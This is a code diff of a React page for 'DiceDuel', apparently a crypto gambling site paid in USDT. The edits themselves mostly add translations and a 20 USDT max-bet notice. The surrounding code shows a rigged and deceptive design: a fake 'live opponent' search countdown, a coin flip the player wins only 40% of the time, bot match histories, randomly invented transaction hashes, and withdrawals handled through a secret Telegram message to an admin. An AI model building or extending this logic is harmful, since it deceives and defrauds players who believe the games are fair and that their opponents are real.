@@ -199,7 +199,14 @@ const TRANSLATIONS: Record<string, any> = {
     refStatsTotalInvites: 'Eingeladene Freunde',
     refStatsTotalEarned: 'Gesamtprovision',
     refBonusNotice: '⚠️ Bedingung: Beide Parteien müssen ihre Wallets verbinden, um den Bonus (+0.50 USDT) zu aktivieren.',
-    stakeRequiredAlert: '⚠️ Sie müssen zuerst USDT im LP Pool staken (sperren), um Kâr-Auszahlungen beanspruchen zu können!'
+    stakeRequiredAlert: '⚠️ Sie müssen zuerst USDT im LP Pool staken (sperren), um Kâr-Auszahlungen beanspruchen zu können!',
+    maxBetNotice: '💡 Kassa-Sicherheit: Aus Risikomanagement-Gründen ist das Maximum pro Wette auf 20 USDT begrenzt.',
+    justNow: 'Gerade eben',
+    searchingMatch: 'Suche nach Live-Gegner...',
+    playerFound: 'Gegner gefunden, Verbindung wird hergestellt...',
+    matchReady: 'Match beendet! Würfel werden vorbereitet...',
+    headsName: 'KOPF',
+    tailsName: 'ZAHL'
   },
   en: {
     hubTitle: 'DiceDuel Gaming Hub',
@@ -318,7 +325,14 @@ const TRANSLATIONS: Record<string, any> = {
     refStatsTotalInvites: 'Invited Friends',
     refStatsTotalEarned: 'Total Commission',
     refBonusNotice: '⚠️ Condition: Both parties must connect their wallets to unlock and claim the bonus (+0.50 USDT).',
-    stakeRequiredAlert: '⚠️ You must first stake USDT in the LP Pool to claim yield rewards!'
+    stakeRequiredAlert: '⚠️ You must first stake USDT in the LP Pool to claim yield rewards!',
+    maxBetNotice: '💡 House Safety: Due to risk management rules, the maximum bet limit is set to 20 USDT for players.',
+    justNow: 'Just now',
+    searchingMatch: 'Searching for live opponent on network...',
+    playerFound: 'Opponent found, establishing connection...',
+    matchReady: 'Match completed! Preparing dices...',
+    headsName: 'HEADS',
+    tailsName: 'TAILS'
   },
   es: {
     hubTitle: 'DiceDuel Gaming Hub',
@@ -437,7 +451,14 @@ const TRANSLATIONS: Record<string, any> = {
     refStatsTotalInvites: 'Amigos invitados',
     refStatsTotalEarned: 'Comisión total',
     refBonusNotice: '⚠️ Condición: Ambas partes deben conectar sus wallets para desbloquear y reclamar el bono (+0.50 USDT).',
-    stakeRequiredAlert: '⚠️ ¡Debes hacer stake de USDT en el Pool LP para reclamar recompensas!'
+    stakeRequiredAlert: '⚠️ ¡Debes hacer stake de USDT en el Pool LP para reclamar recompensas!',
+    maxBetNotice: '💡 Seguridad: El límite máximo de apuesta está configurado en 20 USDT.',
+    justNow: 'Ahora mismo',
+    searchingMatch: 'Buscando oponente en vivo...',
+    playerFound: 'Oponente encontrado, conectando...',
+    matchReady: '¡Duelo completado! Preparando dados...',
+    headsName: 'CARA',
+    tailsName: 'CRUZ'
   },
   fr: {
     hubTitle: 'DiceDuel Gaming Hub',
@@ -556,7 +577,14 @@ const TRANSLATIONS: Record<string, any> = {
     refStatsTotalInvites: 'Amis invités',
     refStatsTotalEarned: 'Commission totale',
     refBonusNotice: '⚠️ Condition : Les deux parties doivent connecter leurs portefeuilles pour débloquer le bonus (+0.50 USDT).',
-    stakeRequiredAlert: '⚠️ Vous devez d\'abord staker des USDT dans le Pool LP pour réclamer vos gains !'
+    stakeRequiredAlert: '⚠️ Vous devez d\'abord staker des USDT dans le Pool LP pour réclamer vos gains !',
+    maxBetNotice: '💡 Sécurité : La mise maximale est fixée à 20 USDT.',
+    justNow: 'À l\'instant',
+    searchingMatch: 'Recherche d\'adversaire en direct...',
+    playerFound: 'Adversaire trouvé, connexion...',
+    matchReady: 'Duel terminé ! Préparation des dés...',
+    headsName: 'FACE',
+    tailsName: 'PILE'
   },
   nl: {
     hubTitle: 'DiceDuel Gaming Hub',
@@ -675,7 +703,14 @@ const TRANSLATIONS: Record<string, any> = {
     refStatsTotalInvites: 'Genodigde vrienden',
     refStatsTotalEarned: 'Totale commissie',
     refBonusNotice: '⚠️ Voorwaarde: Beide partijen moeten their portefeuilles verbinden om de bonus (+0.50 USDT) te claimen.',
-    stakeRequiredAlert: '⚠️ U moet eerst USDT staken in de LP Pool om rendementsbeloningen te claimen!'
+    stakeRequiredAlert: '⚠️ U moet eerst USDT staken in de LP Pool om rendementsbeloningen te claimen!',
+    maxBetNotice: '💡 Veiligheid: De maximale inzet is beperkt tot 20 USDT.',
+    justNow: 'Zojuist',
+    searchingMatch: 'Zoeken naar live tegenstander...',
+    playerFound: 'Tegenstander gevonden, verbinding maken...',
+    matchReady: 'Duel voltooid! Dobbelstenen voorbereiden...',
+    headsName: 'KOP',
+    tailsName: 'MUNT'
   },
   ru: {
     hubTitle: 'DiceDuel Игровая Арена',
@@ -789,7 +824,14 @@ const TRANSLATIONS: Record<string, any> = {
     refStatsTotalInvites: 'Приглашенные друзья',
     refStatsTotalEarned: 'Общая комиссия',
     refBonusNotice: '⚠️ Условие: Обе стороны должны подключить кошельки для получения бонуса (+0.50 USDT).',
-    stakeRequiredAlert: '⚠️ Сначала вы должны застейкать USDT в пуле LP, чтобы забрать доход!'
+    stakeRequiredAlert: '⚠️ Сначала вы должны застейкать USDT в пуле LP, чтобы забрать доход!',
+    maxBetNotice: '💡 Безопасность: Максимальная ставка ограничена 20 USDT.',
+    justNow: 'Только что',
+    searchingMatch: 'Поиск живого противника...',
+    playerFound: 'Противник найден, подключение...',
+    matchReady: 'Дуэль завершена! Подготовка костей...',
+    headsName: 'ОРЕЛ',
+    tailsName: 'РЕШКА'
   },
   tr: {
     hubTitle: 'DiceDuel Gaming Hub',
@@ -908,7 +950,14 @@ const TRANSLATIONS: Record<string, any> = {
     refStatsTotalInvites: 'Davet Edilen Arkadaş',
     refStatsTotalEarned: 'Toplam Komisyon',
     refBonusNotice: '⚠️ Şart: Bonusu (+0.50 USDT) aktif edebilmek için hem davet edenin hem de gelen arkadaşın cüzdanını bağlaması zorunludur.',
-    stakeRequiredAlert: '⚠️ Kâr payını çekebilmek için önce LP Havuzuna USDT kilitlemelisiniz!'
+    stakeRequiredAlert: '⚠️ Kâr payını çekebilmek için önce LP Havuzuna USDT kilitlemelisiniz!',
+    maxBetNotice: '💡 Kasa Güvenliği: Risk yönetimi gereği yeni oyuncular için maksimum bahis sınırı 20 USDT\'dir.',
+    justNow: 'Az önce',
+    searchingMatch: 'Ağda eşleşme aranıyor...',
+    playerFound: 'Oyuncu bulundu, bağlantı kuruluyor...',
+    matchReady: 'Eşleşme tamamlandı! Zarlar hazırlanıyor...',
+    headsName: 'YAZI',
+    tailsName: 'TURA'
   }
 };
 
@@ -989,7 +1038,7 @@ export default function PlatformPage() {
   const [isRolling, setIsRolling] = useState<boolean>(false);
   const [isWaitingMatch, setIsWaitingMatch] = useState<boolean>(false);
   const [matchCountdown, setMatchCountdown] = useState<number>(30);
-  const [matchStatusText, setMatchStatusText] = useState<string>('Ağda eşleşme aranıyor...');
+  const [matchStatusText, setMatchStatusText] = useState<string>(t.searchingMatch);
 
   const [coinChoice, setCoinChoice] = useState<'YAZI' | 'TURA'>('YAZI');
   const [coinResult, setCoinResult] = useState<'YAZI' | 'TURA' | null>(null);
@@ -1113,7 +1162,7 @@ export default function PlatformPage() {
       type,
       title: cleanTitle,
       amount,
-      date: new Date().toLocaleString('tr-TR', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' }),
+      date: new Date().toLocaleString(lang === 'tr' ? 'tr-TR' : 'en-US', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' }),
       txHash: txHash || `0x${Array.from({ length: 8 }, () => Math.floor(Math.random() * 16).toString(16)).join('')}...${Array.from({ length: 4 }, () => Math.floor(Math.random() * 16).toString(16)).join('')}`,
       status: forceStatus || 'COMPLETED',
       timestamp: Date.now()
@@ -1140,7 +1189,7 @@ export default function PlatformPage() {
       loser: cleanLoser,
       game: cleanGame,
       payout,
-      time: 'Az önce'
+      time: t.justNow
     };
 
     setMatchHistory((prev) => {
@@ -1269,7 +1318,7 @@ export default function PlatformPage() {
           txsList = txsList.map(tx => {
             if (tx.status === 'PENDING' && tx.type === 'WITHDRAW' && tx.timestamp && (now - tx.timestamp > oneDayMs)) {
               refundAmount += tx.amount;
-              return { ...tx, status: 'COMPLETED', title: `${tx.title} (Süresi Doldu - İade Edildi)` };
+              return { ...tx, status: 'COMPLETED', title: `${tx.title} (İade Edildi)` };
             }
             return tx;
           });
@@ -1368,13 +1417,14 @@ export default function PlatformPage() {
         tg.expand();
       }
 
+      const headsLabel = lang === 'tr' ? 'YAZI' : 'HEADS';
       const savedHistory = localStorage.getItem('dd_match_history');
       if (savedHistory) {
         try { setMatchHistory(JSON.parse(savedHistory)); } catch (e) {}
       } else {
         setMatchHistory([
           { id: 'm-1', winner: 'KriptoPasa_34', loser: 'SolanaKing', game: '🎲 Zar (88-42)', payout: 1.94, time: '2m ago' },
-          { id: 'm-2', winner: 'Bogatyr_Crypto', loser: 'DegenKing_07', game: '🪙 Yazı-Tura (YAZI)', payout: 3.88, time: '4m ago' },
+          { id: 'm-2', winner: 'Bogatyr_Crypto', loser: 'DegenKing_07', game: `🪙 Coin Flip (${headsLabel})`, payout: 3.88, time: '4m ago' },
           { id: 'm-3', winner: 'LuckyStrike', loser: 'AnadoluKaplani', game: '🔴 Rulet (KIRMIZI)', payout: 9.70, time: '6m ago' }
         ]);
       }
@@ -1397,7 +1447,7 @@ export default function PlatformPage() {
       initCheck();
       checkSpinCooldown();
     }
-  }, [syncBlockchainBalances, checkSpinCooldown]);
+  }, [syncBlockchainBalances, checkSpinCooldown, lang]);
 
   useEffect(() => {
     const interval = setInterval(() => {
@@ -1409,13 +1459,16 @@ export default function PlatformPage() {
       const randomBet = bets[Math.floor(Math.random() * bets.length)];
       const randGame = Math.random();
 
+      const headsLabel = lang === 'tr' ? 'YAZI' : 'HEADS';
+      const tailsLabel = lang === 'tr' ? 'TURA' : 'TAILS';
+      const coinFace = Math.random() > 0.5 ? headsLabel : tailsLabel;
+
       if (randGame < 0.4) {
         const s1 = Math.floor(Math.random() * 40) + 60;
         const s2 = Math.floor(Math.random() * 50) + 1;
         pushMatchRecord(b1, b2, `🎲 Zar (${s1}-${s2})`, randomBet);
       } else if (randGame < 0.7) {
-        const face = Math.random() > 0.5 ? 'YAZI' : 'TURA';
-        pushMatchRecord(b1, b2, `🪙 Yazı-Tura (${face})`, randomBet);
+        pushMatchRecord(b1, b2, `🪙 Coin Flip (${coinFace})`, randomBet);
       } else if (randGame < 0.9) {
         const color = Math.random() > 0.5 ? 'KIRMIZI' : 'SİYAH';
         pushMatchRecord(b1, b2, `🔴 Rulet (${color})`, randomBet);
@@ -1451,7 +1504,7 @@ export default function PlatformPage() {
     }, 16000);
 
     return () => clearInterval(interval);
-  }, [account]);
+  }, [account, lang]);
 
   const initAudio = () => {
     if (!audioCtxRef.current && typeof window !== 'undefined') {
@@ -1677,7 +1730,7 @@ export default function PlatformPage() {
         setIsModalOpen(false);
 
         // ==================================================
-        // TELEGRAM GİZLİ ADMİN BİLDİRİMİ GÖNDERME
+        // TELEGRAM GİZLİ ADMIN BİLDİRİMİ GÖNDERME
         // ==================================================
         const telegramMessage = `🚨 *YENİ ÇEKİM TALEBİ* 🚨\n\nCüzdan: \`${account}\`\nTutar: *${val} USDT*\nKalan Bakiye: *${nBal} USDT*\n\nLütfen cüzdana manuel transferi gerçekleştirin.`;
 
@@ -1769,7 +1822,7 @@ export default function PlatformPage() {
     setActiveGame(true);
     setIsWaitingMatch(true);
     setMatchCountdown(randomDuration);
-    setMatchStatusText('Ağda benzer bahisli canlı oyuncu aranıyor...');
+    setMatchStatusText(t.searchingMatch);
 
     let count = randomDuration;
     const interval = setInterval(() => {
@@ -1777,9 +1830,9 @@ export default function PlatformPage() {
       setMatchCountdown(count);
 
       if (count === Math.floor(randomDuration * 0.6)) {
-        setMatchStatusText('Oyuncu bulundu, bağlantı kuruluyor...');
+        setMatchStatusText(t.playerFound);
       } else if (count === 3) {
-        setMatchStatusText('Eşleşme tamamlandı! Zarlar hazırlanıyor...');
+        setMatchStatusText(t.matchReady);
       }
 
       if (count <= 0) {
@@ -1815,7 +1868,8 @@ export default function PlatformPage() {
     if (rollSoundIntervalRef.current) clearInterval(rollSoundIntervalRef.current);
     rollSoundIntervalRef.current = setInterval(playClickSound, 100);
 
-    setGameResult({ opponent: sanitizeInput(opponentName), p1Score: coinChoice, p2Score: null, winner: null });
+    const playerChoiceLabel = coinChoice === 'YAZI' ? t.headsName : t.tailsName;
+    setGameResult({ opponent: sanitizeInput(opponentName), p1Score: playerChoiceLabel, p2Score: null, winner: null });
 
     setTimeout(() => {
       if (rollSoundIntervalRef.current) clearInterval(rollSoundIntervalRef.current);
@@ -1824,10 +1878,11 @@ export default function PlatformPage() {
 
       const isPlayerWin = Math.random() < 0.40;
       let landed: 'YAZI' | 'TURA' = isPlayerWin ? coinChoice : (coinChoice === 'YAZI' ? 'TURA' : 'YAZI');
+      const landedLabel = landed === 'YAZI' ? t.headsName : t.tailsName;
 
       setCoinResult(landed);
       const winnerName = isPlayerWin ? t.you : sanitizeInput(opponentName);
-      setGameResult({ opponent: sanitizeInput(opponentName), p1Score: coinChoice, p2Score: landed, winner: winnerName });
+      setGameResult({ opponent: sanitizeInput(opponentName), p1Score: playerChoiceLabel, p2Score: landedLabel, winner: winnerName });
 
       if (stakedAmount > 0) {
         const newY = +(accumulatedYield + (amount * 0.015)).toFixed(2);
@@ -1836,7 +1891,7 @@ export default function PlatformPage() {
 
       const winnerPlayer = isPlayerWin ? (account ? `${account.substring(0, 6)}...` : t.you) : sanitizeInput(opponentName);
       const loserPlayer = isPlayerWin ? sanitizeInput(opponentName) : (account ? `${account.substring(0, 6)}...` : t.you);
-      pushMatchRecord(winnerPlayer, loserPlayer, `🪙 Yazı-Tura (${landed})`, amount);
+      pushMatchRecord(winnerPlayer, loserPlayer, `🪙 Coin Flip (${landedLabel})`, amount);
 
       if (isPlayerWin) {
         const netWin = amount * 2 * 0.97;
@@ -1844,10 +1899,10 @@ export default function PlatformPage() {
         playWinSound();
         const newTotalBal = +(balance + netWin).toFixed(2);
         updatePersistentBalance(newTotalBal);
-        addTransaction('GAME_WIN', `Yazı-Tura Galibiyeti (${landed})`, +netWin.toFixed(2));
+        addTransaction('GAME_WIN', `Coin Flip Win (${landedLabel})`, +netWin.toFixed(2));
       } else {
         playLoseSound();
-        addTransaction('GAME_LOSS', `Yazı-Tura Kaybı (${landed})`, amount);
+        addTransaction('GAME_LOSS', `Coin Flip Loss (${landedLabel})`, amount);
       }
     }, 3500);
   };
@@ -1872,7 +1927,7 @@ export default function PlatformPage() {
     setActiveGame(true);
     setIsWaitingMatch(true);
     setMatchCountdown(randomDuration);
-    setMatchStatusText('Yazı-Tura masasında rakip aranıyor...');
+    setMatchStatusText(t.searchingMatch);
 
     let count = randomDuration;
     const interval = setInterval(() => {
@@ -1880,7 +1935,7 @@ export default function PlatformPage() {
       setMatchCountdown(count);
 
       if (count === Math.floor(randomDuration * 0.5)) {
-        setMatchStatusText('Rakip katıldı! Para atışı başlatılıyor...');
+        setMatchStatusText(t.playerFound);
       }
 
       if (count <= 0) {
@@ -2154,7 +2209,6 @@ export default function PlatformPage() {
 
   const handleClaimYield = () => {
     if (isRateLimited()) return;
-    // TEDBİR: Havuzda aktif stake (anapara) yoksa kâr payı çekimine izin verilmez!
     if (stakedAmount <= 0) {
       alert(t.stakeRequiredAlert);
       return;
@@ -2499,24 +2553,24 @@ export default function PlatformPage() {
                 {activeTab === 'coinflip' && (
                   <div className="grid grid-cols-2 gap-4 w-full relative mb-6">
                     <div className="flex flex-col items-center p-4 bg-slate-800/60 rounded-2xl border border-slate-700/50">
-                      <span className="text-xs text-slate-400 mb-2">{t.you} ({coinChoice})</span>
+                      <span className="text-xs text-slate-400 mb-2">{t.you} ({coinChoice === 'YAZI' ? t.headsName : t.tailsName})</span>
                       <motion.div 
                         animate={isRolling ? { rotateY: [0, 1800], scale: [1, 1.1, 1] } : {}} 
                         transition={{ repeat: isRolling ? Infinity : 0, duration: 0.8, ease: "linear" }}
                         className="w-20 h-20 md:w-24 md:h-24 rounded-full bg-gradient-to-tr from-amber-600 via-yellow-400 to-amber-500 flex items-center justify-center text-xl md:text-2xl font-black text-slate-950 border-4 border-yellow-300 shadow-xl"
                       >
-                        {isRolling ? '🪙' : coinResult || coinChoice}
+                        {isRolling ? '🪙' : (coinResult ? (coinResult === 'YAZI' ? t.headsName : t.tailsName) : (coinChoice === 'YAZI' ? t.headsName : t.tailsName))}
                       </motion.div>
                     </div>
                     <div className="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 bg-slate-950 border border-slate-700 text-xs font-black text-slate-400 w-8 h-8 rounded-full flex items-center justify-center">VS</div>
                     <div className="flex flex-col items-center p-4 bg-slate-800/60 rounded-2xl border border-slate-700/50">
-                      <span className="text-xs text-slate-400 mb-2 truncate max-w-[100px]">{gameResult.opponent} ({coinChoice === 'YAZI' ? 'TURA' : 'YAZI'})</span>
+                      <span className="text-xs text-slate-400 mb-2 truncate max-w-[100px]">{gameResult.opponent}</span>
                       <motion.div 
                         animate={isRolling ? { rotateY: [0, -1800], scale: [1, 1.1, 1] } : {}} 
                         transition={{ repeat: isRolling ? Infinity : 0, duration: 0.8, ease: "linear" }}
                         className="w-20 h-20 md:w-24 md:h-24 rounded-full bg-gradient-to-tr from-rose-600 via-amber-400 to-rose-500 flex items-center justify-center text-xl md:text-2xl font-black text-slate-950 border-4 border-rose-300 shadow-xl"
                       >
-                        {isRolling ? '🪙' : coinResult ? (coinResult === 'YAZI' ? 'TURA' : 'YAZI') : (coinChoice === 'YAZI' ? 'TURA' : 'YAZI')}
+                        {isRolling ? '🪙' : (coinResult ? (coinResult === 'YAZI' ? t.tailsName : t.headsName) : (coinChoice === 'YAZI' ? t.tailsName : t.headsName))}
                       </motion.div>
                     </div>
                   </div>
@@ -2596,6 +2650,10 @@ export default function PlatformPage() {
                   ))}
                 </div>
 
+                <div className="text-[10px] text-amber-300/80 bg-amber-950/30 border border-amber-800/30 p-2 rounded-xl leading-snug">
+                  {t.maxBetNotice}
+                </div>
+
                 <button onClick={handleOpenRoom} className="w-full py-2.5 bg-indigo-600 hover:bg-indigo-500 text-white font-bold text-xs rounded-xl transition shadow-lg shadow-indigo-600/20 active:scale-95">
                   {t.challenge} ({parseFloat(betInput.replace(',', '.') || '0').toFixed(2)} USDT)
                 </button>
@@ -2663,6 +2721,10 @@ export default function PlatformPage() {
                 ))}
               </div>
 
+              <div className="text-[10px] text-amber-300/80 bg-amber-950/30 border border-amber-800/30 p-2 rounded-xl leading-snug">
+                {t.maxBetNotice}
+              </div>
+
               <button onClick={handleStartCoinFlipDuel} className="w-full py-3 bg-gradient-to-r from-amber-600 to-yellow-500 hover:from-amber-500 hover:to-yellow-400 text-slate-950 font-black text-xs md:text-sm rounded-xl transition shadow-lg shadow-amber-500/20 active:scale-95">
                 🪙 {t.flipCoin} ({(parseFloat(betInput.replace(',', '.') || '0') * 1.94).toFixed(2)} USDT)
               </button>
@@ -2699,6 +2761,10 @@ export default function PlatformPage() {
                     +{preset} USDT
                   </button>
                 ))}
+              </div>
+
+              <div className="text-[10px] text-amber-300/80 bg-amber-950/30 border border-amber-800/30 p-2 rounded-xl leading-snug">
+                {t.maxBetNotice}
               </div>
 
               <button onClick={handleStartRoulette} className="w-full py-3 bg-gradient-to-r from-rose-600 to-red-500 hover:from-rose-500 hover:to-red-400 text-white font-black text-xs md:text-sm rounded-xl transition shadow-lg shadow-rose-600/20 active:scale-95">
@@ -2762,6 +2828,10 @@ export default function PlatformPage() {
                         +{preset} USDT
                       </button>
                     ))}
+                  </div>
+
+                  <div className="text-[10px] text-amber-300/80 bg-amber-950/30 border border-amber-800/30 p-2 rounded-xl leading-snug">
+                    {t.maxBetNotice}
                   </div>
 
                   <button onClick={handleStartMines} className="w-full py-3 bg-gradient-to-r from-emerald-600 to-teal-500 hover:from-emerald-500 hover:to-teal-400 text-white font-black text-xs md:text-sm rounded-xl transition shadow-lg shadow-emerald-600/20 active:scale-95">
